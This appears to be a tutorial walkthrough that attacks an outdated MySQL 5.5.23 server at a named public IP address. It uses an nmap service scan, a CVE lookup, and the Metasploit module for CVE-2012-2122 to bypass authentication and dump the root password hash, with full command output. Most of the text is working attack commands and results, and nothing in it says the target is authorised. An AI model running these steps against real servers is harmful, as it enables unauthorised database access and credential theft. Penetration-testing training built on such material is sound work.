# Example: Exploiting old MySQL database with nmap and metasploit
IP Address: `http://188.166.120.53/`

Let's have a look at it!

---

Let's install nmap - a port scanning tool:

`$ apt-get update && apt-get install nmap`


`$ nmap -v -A -sV 188.166.120.53`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b7:ca:32:1d:78:a3:9f:c3:4e:12:99:c2:e0:ca:9f:8a (RSA)
|   256 14:47:96:51:48:0d:88:78:0f:ff:d0:a7:29:42:1b:7b (ECDSA)
|_  256 fc:1b:a0:b2:a5:4d:98:2e:c7:d2:20:db:39:6d:72:b4 (ED25519)
3306/tcp open  mysql   MySQL 5.5.23
| mysql-info:
|   Protocol: 10
|   Version: 5.5.23
|   Thread ID: 4
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, LongColumnFlag, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, LongPassword, IgnoreSpaceBeforeParenthesis, FoundRows, InteractiveClient, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, ODBCClient, SupportsLoadDataLocal, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: /B@XyyrS&cDeSOrqaq7\
|_  Auth Plugin Name: mysql_native_password
```

Okay, so the web server has two open ports, one for ssh and one for mysql. On the more interesting side, we can see that MySQL is version 5.5.23, which is quite old.

![alt text](https://i.imgur.com/AihfEd0.png)

Let's see if there are any publically known vulnerabilities for this version using https://www.cvedetails.com/

We will go to "Vulnerability Search" and search for public exploits

![alt text](https://i.imgur.com/UjYMwWv.png)
![alt text](https://i.imgur.com/QV61z2j.png)

From the search results we gather that `CVE-2012-5612`, `CVE-2012-5611`, and `CVE-2012-2122` seems applicable for MySQL 5.5.23.

We are not really interested in Denial-of-Service (DoS), so let us focus on `CVE-2012-2122`.

Hopping back into the metasploit console:

	msf6 > search CVE-2012-2122


```
Matching Modules
================

   #  Name                                               Disclosure Date  Rank    Check  Description
   -  ----                                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/mysql/mysql_authbypass_hashdump  2012-06-09       normal  No     MySQL Authentication Bypass Password Dump


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mysql/mysql_authbypass_hashdump
```

Now we just plug in the module, and let it do its magic:

`msf6 > use auxiliary/scanner/mysql/mysql_authbypass_hashdump`

`msf6 > show options`

```
Module options (auxiliary/scanner/mysql/mysql_authbypass_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     3306             yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME  root             yes       The username to authenticate as
```

We need to specify RHOSTS:

`msf6 > set RHOSTS 188.166.120.53`

`msf6 > exploit`

```
[+] 188.166.120.53:3306   - 188.166.120.53:3306 The server allows logins, proceeding with bypass test
[*] 188.166.120.53:3306   - 188.166.120.53:3306 Authentication bypass is 10% complete
[*] 188.166.120.53:3306   - 188.166.120.53:3306 Authentication bypass is 20% complete
[+] 188.166.120.53:3306   - 188.166.120.53:3306 Successfully bypassed authentication after 252 attempts. URI: mysql://root:X@188.166.120.53:3306
[+] 188.166.120.53:3306   - 188.166.120.53:3306 Successfully exploited the authentication bypass flaw, dumping hashes...
[+] 188.166.120.53:3306   - 188.166.120.53:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
[+] 188.166.120.53:3306   - 188.166.120.53:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
[+] 188.166.120.53:3306   - 188.166.120.53:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
[+] 188.166.120.53:3306   - 188.166.120.53:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
[+] 188.166.120.53:3306   - 188.166.120.53:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
[+] 188.166.120.53:3306   - 188.166.120.53:3306 Hash Table has been saved: /root/.msf4/loot/20210412114810_default_188.166.120.53_mysql.hashes_956264.txt
[*] 188.166.120.53:3306   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

We have now acquired the hash of the password for the root user. If it is a weak password, it could be crackable in a very finite amount of time.

